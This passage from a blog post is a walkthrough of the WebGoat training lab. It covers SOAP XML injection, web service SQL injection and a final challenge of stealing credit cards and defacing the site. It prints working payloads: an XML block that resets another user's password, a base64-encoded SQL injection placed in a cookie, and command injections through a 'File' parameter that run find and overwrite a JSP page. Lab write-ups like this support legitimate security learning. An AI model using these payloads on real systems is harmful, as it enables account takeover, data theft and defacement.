<p><img class="center" src="/images/webgoat/sax_inject.png" title="&lsquo;sax injection&rsquo; &lsquo;sax injection&rsquo;" ></p>

<p>The XML displayed on the page controls the password change. The solution was to add some XML for a user with another id than 101, by intercepting the request and adding the XML data in the password field:</p>

<p><code>xml
&lt;wsns1:changePassword&gt;
&lt;id xsi:type='xsd:int'&gt;102&lt;/id&gt;
&lt;password xsi:type='xsd:string'&gt;102&lt;/password&gt;
 &lt;/wsns1:changePassword&gt;
</code></p>

<p><strong>Web Service SQL Injection</strong></p>

<p><img class="center" src="/images/webgoat/wsdl_sqli.png" title="&lsquo;wsdl sqli&rsquo; &lsquo;wsdl sqli&rsquo;" ></p>

<p>Again, SoapUI comes to the rescue:</p>

<p><img class="center" src="/images/webgoat/soap_sqli.png" title="&lsquo;soap sqli&rsquo; &lsquo;soap sqli&rsquo;" ></p>

<h3>Challenge</h3>

<p><strong>The CHALLENGE!</strong></p>

<p>Your mission is to break the authentication scheme, steal all the credit cards from the database, and then deface the website. You will have to use many of the techniques you have learned in the other lessons. The main webpage to deface for this site is &lsquo;webgoat_challenge_guest.jsp&rsquo;</p>

<p>This lesson doesn&rsquo;t have the option to show the Java code. But from earlier lessons, we know how the Show Java button works:</p>

<p><code>html
onclick="makeWindow(this.href+ '?source=true', 'Java Source')
</code></p>

<p>So, we need to go to this URL <code><a href="http://localhost:8080/WebGoat/source?source=true">http://localhost:8080/WebGoat/source?source=true</a></code> from the lesson page. By looking around in the challenge code, we can see these values:</p>

<p><code>java
private String pass = "goodbye";
private String user = "youaretheweakestlink";
</code></p>

<p>We can login now and proceed to the next stage.</p>

<p><img class="center" src="/images/webgoat/challenge_creds.png" title="&lsquo;challenge credit cards&rsquo; &lsquo;challenge credit cards&rsquo;" ></p>

<p>Playing around in WebScarab while sending requests, I noticed this cookie that I haven&rsquo;t observed before: <code>user=&ldquo;eW91YXJldGhld2Vha2VzdGxpbms=&rdquo;;</code>. Decoding the Base64, the value is indeed our username, <em>youaretheweakestlink</em>. So I tried some SQL injection on it, but that seemed to break the credit card solution list. In the end, I thought about encoding the injection, since the data in the cookie was Base64 encoded, and it worked!</p>

<p>The injection string that worked was <code>youaretheweakestlink' or &lsquo;1&rsquo;=&lsquo;1</code>, and the encoded variant was <code>eW91YXJldGhld2Vha2VzdGxpbmsnIG9yICcxJz0nMQ==</code>. It didn&rsquo;t work until I also kept the username part.</p>

<p>The final stage is to deface the site.</p>

<p><img class="center" src="/images/webgoat/deface1.png" title="&lsquo;challenge stage 3&rsquo; &lsquo;challenge stage 3&rsquo;" ></p>

<p><img class="center" src="/images/webgoat/deface2.png" title="&lsquo;challenge stage 3&rsquo; &lsquo;challenge stage 3&rsquo;" ></p>

<p><img class="center" src="/images/webgoat/deface3.png" title="&lsquo;challenge stage 3&rsquo; &lsquo;challenge stage 3&rsquo;" ></p>

<p>To deface the site, we will exploit a remote code execution vulnerability. We know the name of the file we need for defacing, but we don&rsquo;t know where it&rsquo;s located. By clicking the View Network button and intercepting the request, we can see there is a file parameter involved. And we can inject an additional command: <code>SUBMIT=View+Network&amp;File=tcp;find / -name webgoat_challenge_guest.jsp -print -quit</code>. This will tell find to search for the file starting from the root directory, and quit after the first match, otherwise it would take long. And we can see the results printed on the screen:</p>

<p><img class="center" src="/images/webgoat/deface4.png" title="&lsquo;challenge stage 3&rsquo; &lsquo;challenge stage 3&rsquo;" ></p>

<p>Now that we know where the file is, we can output some text to it to complete the defacement: <code>SUBMIT=View+Network&amp;File=tcp;echo &ldquo;We serve free 0 days!&rdquo; > /root/WebGoat-5.4/tomcat/webapps/WebGoat/webgoat_challenge_guest.jsp</code>.</p>

<p><img class="center" src="/images/webgoat/deface5.png" title="&lsquo;deface&rsquo; &lsquo;deface&rsquo;" ></p>

<p>And, with this, the WebGoat pentest lab is concluded! This was a massive post, and it took me a while. It&rsquo;s been my favorite web application challenge so far, the amount and variety of the exercises was great, and it covered many common vulnerabilities. Can&rsquo;t recommend this enough!</p>

<p>Fortune cookie:</p>

<blockquote><p>You will experience a strong urge to do good; but it will pass.</p></blockquote>
]]></content>
  </entry>
  
</feed>
